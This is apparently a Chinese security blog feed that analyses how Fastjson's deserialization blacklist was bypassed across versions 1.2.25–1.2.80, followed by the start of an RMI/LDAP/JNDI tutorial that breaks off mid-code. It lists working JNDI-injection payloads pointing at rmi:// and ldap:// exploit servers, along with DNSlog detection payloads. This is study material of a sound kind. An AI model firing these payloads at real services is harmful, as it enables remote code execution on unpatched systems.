\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br></pre></td></tr></table></figure><h2 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1.2.25-1.2.42"></a>1.2.25-1.2.42</h2><p>修复情况:</p><ul><li>在checkautotype中新增了对首字母L的处理，匹配到L开头;结尾进行一层首尾字符过滤去除</li><li>对黑白名单类进行hash取值</li></ul><p>1.2.42版本在checkautotype方法中，先过滤了一层首尾符号</p><p><img src="/posts/ad3be000/fj-22.png" title="第一层过滤首尾符号"></p><p>然后通过hash去设置黑白名单，目的为了不让攻击者知道黑名单是什么明文内容</p><p><img src="/posts/ad3be000/fj-23.png" title="hash的黑白名单"><br><img src="/posts/ad3be000/fj-24.png" title="hash的黑白名单"></p><p>hash碰撞脚本：<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>若不是黑名单中的类，进入类加载，这里跟原来一样，会再次过滤首尾符号L&#x2F;;，其他没有变动<br><img src="/posts/ad3be000/fj-25.png" title="第二层过滤首尾符号"></p><p>可通过加两层L&#x2F;;即可绕过42版本的修复，[符号的绕过方式仍然可行，得到payload：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be000/fj-26.png" title="绕过42执行"><br><img src="/posts/ad3be000/fj-29.png" title="绕过42执行"></p><h2 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h2><p>修复方式：</p><ul><li>新增加对LL的判断。</li></ul><p>如果首字母为LL开头直接抛出异常，是L开头则去掉首尾符号</p><p><img src="/posts/ad3be000/fj-30.png" title="新增对LL的判断"></p><p>对L和LL都进行处理过后，L的绕过方法就走不通了，但是[方法还可以继续使用没有被过滤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be000/fj-31.png" title="绕过43执行"></p><h2 id="1-2-25-1-2-44"><a href="#1-2-25-1-2-44" class="headerlink" title="1.2.25-1.2.44"></a>1.2.25-1.2.44</h2><p>修复方式：</p><ul><li>新增对[的判断</li></ul><p>如果匹配到首字符是[符号，则直接抛出异常，因此45版本中直接使用L和[的两条攻击方式都失效了</p><p><img src="/posts/ad3be000/fj-32.png" title="[判断过滤"></p><h2 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h2><p>绕过方式依赖第三方组件mybatis，版本在3.0.0&lt;3.5.0之间，该组件在当前版本不在黑名单当中</p><p><img src="/posts/ad3be000/fj-33.png" title="mybatis组件"></p><p>payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用类为<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>，方法名为<code>properties</code>，参数为<code>data_source</code></p><p>这里比较好理解，fastjson通过<code>setter</code>器获取<code>properties</code>参数的<code>setproperties</code>方法，通过反射进行执行，这里的分析跟上面的JDBC链分析是一样的就不重复分析了</p><p><img src="/posts/ad3be000/fj-34.png" title="mybatis利用"></p><p>调用<code>setproperties</code>方法，该方法调用了JNDI，JNDI远程<code>lookup</code>地址为<code>properties.getProperty(DATA_SOURCE)</code>，也就是传入的<code>data_source</code>的值，触发漏洞</p><p><img src="/posts/ad3be000/fj-35.png" title="绕过45执行"></p><p>后面版本就将该类加到了黑名单当中</p><h2 id="1-2-25-1-2-47通杀绕过"><a href="#1-2-25-1-2-47通杀绕过" class="headerlink" title="1.2.25-1.2.47通杀绕过"></a>1.2.25-1.2.47通杀绕过</h2><p>payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">       <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">       <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">       <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">       <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/RMIObject&quot;</span>,</span><br><span class="line">       <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析这里直接到关键步骤吧，前面流程跟上面分析的一样，直接循环调用到<code>parseObject</code>方法解析对象</p><p><img src="/posts/ad3be000/fj-36.png" title="parseObject"></p><p>然后会调用<code>checkautotype</code>进行黑白名单处理</p><p><img src="/posts/ad3be000/fj-37.png" title="checkautotype"></p><p>由于未开启<code>autoypesupport</code>，因此不会进入黑白名单匹配检测</p><p><img src="/posts/ad3be000/fj-38.png" title="autoypesupport"></p><p>由于<code>Map</code>为空，因此在<code>map</code>中找不到该<code>typename</code>，然后从<code>hashmap</code>中找到</p><p><img src="/posts/ad3be000/fj-39.png" title="map"></p><p>获取<code>clazz</code>和反序列化器<code>deserializer</code>后，进行反序列化<code>deserialze</code>操作</p><p><img src="/posts/ad3be000/fj-40.png" title="deserialze"></p><p>进入<code>MiscCodec.deserialze</code>方法，对解析对象进行解析获取值</p><p><img src="/posts/ad3be000/fj-41.png" title="parse"><br><img src="/posts/ad3be000/fj-42.png" title="val"></p><p>再将值赋值给<code>strVal</code></p><p><img src="/posts/ad3be000/fj-43.png" title="strVal"></p><p>然后判断<code>clazz</code>类型，进行不同处理，当<code>clazz</code>为<code>Class</code>类时，会进行类加载操作</p><p><img src="/posts/ad3be000/fj-44.png" title="loadClass"></p><p>跟进，调用缓存变量为<code>true</code>的<code>loadClass</code>方法</p><p><img src="/posts/ad3be000/fj-45.png" title="loadClass"></p><p>经过一些过滤判断，最后将<code>clazz</code>放入<code>map</code>缓存中</p><p><img src="/posts/ad3be000/fj-45.png" title="mappings.put"></p><p><font color="red">“a”主体的代码段的作用就在这里，利用java.lang.Class类绕过黑白名单然后将恶意代码类写入map缓存中</font></p><p>然后再次循环解析对象到”b”这里，跟进<code>parseObject</code>方法</p><p><img src="/posts/ad3be000/fj-46.png" title="parseObject"></p><p>再次走到黑白名单过滤方法</p><p><img src="/posts/ad3be000/fj-47.png" title="checkautotype"></p><p>依旧，直接跳过黑白名单判断，从<code>mapping</code>缓存中读取类对象</p><p><img src="/posts/ad3be000/fj-48.png" title="checkautotype"></p><p>由于”a”主体代码执行的时候将恶意类<code>put</code>进了<code>mapping</code>缓存中，因此这个读取能读取到恶意类的<code>clazz</code>，绕过了黑白名单检测</p><p><img src="/posts/ad3be000/fj-49.png" title="获取clazz"></p><p>获取到<code>clazz</code>后，进行正式反序列化操作，后续的操作就不再分析了，跟上面分析<code>jdbc</code>的执行一样的流程</p><p><img src="/posts/ad3be000/fj-50.png" title="deserialze"></p><p><img src="/posts/ad3be000/fj-51.png" title="执行成功"></p><p>1.2.48版本过后修复把cache缓存标识改为了false，无法再使用该payload</p><p>大于48版本后面的基本上就是绕过黑名单限制的类，就不做分析了，跟前面类似，就记下网上公开的payload吧</p><h2 id="1-2-50-1-2-59"><a href="#1-2-50-1-2-59" class="headerlink" title="1.2.50-1.2.59"></a>1.2.50-1.2.59</h2><p>payload：<br>使用前提：开启autotype，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-50-1-2-60"><a href="#1-2-50-1-2-60" class="headerlink" title="1.2.50-1.2.60"></a>1.2.50-1.2.60</h2><p>payload:<br>无需开启autotype</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-50-1-2-61"><a href="#1-2-50-1-2-61" class="headerlink" title="1.2.50-1.2.61"></a>1.2.50-1.2.61</h2><p>payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;Object&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-24-1-2-62"><a href="#1-2-24-1-2-62" class="headerlink" title="1.2.24-1.2.62"></a>1.2.24-1.2.62</h2><p>payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span>&#125;</span><br><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>,<span class="string">&quot;parameters&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Hashtable&quot;</span>,<span class="string">&quot;java.naming.factory.initial&quot;</span>:<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="string">&quot;topic-factory&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;,<span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-24-1-2-66"><a href="#1-2-24-1-2-66" class="headerlink" title="1.2.24-1.2.66"></a>1.2.24-1.2.66</h2><p>需要开启autotype<br>payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br><span class="line">&gt; ​&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;​</span><br><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;​</span><br><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;​</span><br><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;UserTransaction&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1399/Calc&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-24-1-2-67"><a href="#1-2-24-1-2-67" class="headerlink" title="1.2.24-1.2.67"></a>1.2.24-1.2.67</h2><p>需要开启autotype<br>payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br><span class="line">&gt; ​&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-24-1-2-68"><a href="#1-2-24-1-2-68" class="headerlink" title="1.2.24-1.2.68"></a>1.2.24-1.2.68</h2><p>无需开启AutoType</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt; &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;vul.VulAutoCloseable&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-24-1-2-80"><a href="#1-2-24-1-2-80" class="headerlink" title="1.2.24-1.2.80"></a>1.2.24-1.2.80</h2><p>可以参考su18师傅的<a href="https://github.com/su18/hack-fastjson-1.2.80">payload</a>和Y4er师傅的<a href="https://y4er.com/posts/fastjson-1.2.80/">分析文章</a></p><h2 id="检测payload"><a href="#检测payload" class="headerlink" title="检测payload"></a>检测payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetAddress&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog.cn&quot;</span>&#125; </span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="string">&quot;address&quot;</span>:,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.URL&quot;</span>, <span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;:<span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line">Set[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;]</span><br><span class="line">Set[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;:<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="0x03、总结"><a href="#0x03、总结" class="headerlink" title="0x03、总结"></a>0x03、总结</h1><p>在48版本开始疯狂的bypass黑名单，大体跟完fastjson的修复感觉就是掉一个捡一个，还是学到很多，其中还有些涉及到不出网的利用还没分析学习，后面再跟</p><h1 id="0x04、参考链接"><a href="#0x04、参考链接" class="headerlink" title="0x04、参考链接"></a>0x04、参考链接</h1><p><a href="https://drun1baby.github.io/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://drun1baby.github.io/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</a><br><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7">https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7</a><br><a href="https://cloud.tencent.com/developer/article/1957185">https://cloud.tencent.com/developer/article/1957185</a><br><a href="https://xie.infoq.cn/article/2e75402d042279ad0845faba9">https://xie.infoq.cn/article/2e75402d042279ad0845faba9</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-RMI&amp;LDAP&amp;JNDI原理分析学习</title>
      <link href="/posts/ad3be040.html"/>
      <url>/posts/ad3be040.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习三个协议的源码分析，源码基础实现和漏洞分析学习写了很大篇幅，高版本绕过没写进去，费了挺长时间。</p><h1 id="0x01、RMI"><a href="#0x01、RMI" class="headerlink" title="0x01、RMI"></a>0x01、RMI</h1><h2 id="一、RMI描述"><a href="#一、RMI描述" class="headerlink" title="一、RMI描述"></a>一、RMI描述</h2><p>RMI（远程方法调用），java的一种用于实现远程过程调用的应用程序接口，采用分布式应用程序思想。</p><p>主要构成：<br><strong>Client(客户端)</strong> ：通过向注册中心获取服务端信息进而远程调用服务器。</p><ul><li>存根（skeleton）&#x2F;桩(Stub)：远程对象在客户端上的代理。</li><li>远程引用层(Remote Reference Layer):解析并执行远程引用协议</li><li>传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。</li></ul><p><strong>Server(服务端)</strong> ：开启远程调用的服务器。</p><ul><li>骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。</li><li>远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用。</li><li>传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。</li></ul><p><strong>Registry(注册中心)</strong> ：以URL形式注册远程对象，并向客户端回复对远程对象的引用。</p><p>引用官方的图：</p><p><img src="/posts/ad3be040/r-1.png" title="rmi"></p><p>其中实现远程方法的类必须实现Remote接口，并且该类必须继承UnicastRemoteObject类。<br>或者可以不继承UnicastRemoteObject类，调用UnicastRemoteObject.exportObject()手工进行初始化。</p><p><img src="/posts/ad3be040/r-2.png" title="不继承实现"></p><p>注：客户端和服务端的接口需要相同的包名才能序列化反序列化</p><h2 id="二、RMI简单实现"><a href="#二、RMI简单实现" class="headerlink" title="二、RMI简单实现"></a>二、RMI简单实现</h2><p>简述实现过程:<br>服务器端（Server）：</p><ul><li>先创建实现Remote的接口</li><li>实现远程调用服务对象类</li><li>创建服务端类，对实现Remote的接口对象生成远程调用服务类，通过注册中心绑定该调用对象。</li></ul><p>客户端（Client）:</p><ul><li>先创建实现Remote的接口</li><li>通过注册中心获取远程调用服务端口，将服务名绑定给接口对象</li><li>接口对象调用远程服务端程序执行方法。</li></ul><h3 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h3><p>实现Remote的对象接口：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-3.png" title="实现Remote的对象接口"></p><p>实现调用服务类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-4.png" title="实现调用服务类"></p><p>开启服务端:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">//创建远程调用对象，这一步已经开启远程调用服务了</span></span><br><span class="line">        RMIObject rmo=<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>();</span><br><span class="line">        <span class="comment">//创建注册中心绑定调用端口</span></span><br><span class="line">        Registry rg= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//注册绑定调用服务</span></span><br><span class="line">        rg.bind(<span class="string">&quot;RMIObject&quot;</span>,rmo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-7.png" title="开启服务端"></p><h3 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h3><p>实现Remote的对象接口：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-8.png" title="实现Remote的对象接口"></p><p>客户端进行远程调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        Registry rg= LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        RMIObject rc=(RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        rc.hello(<span 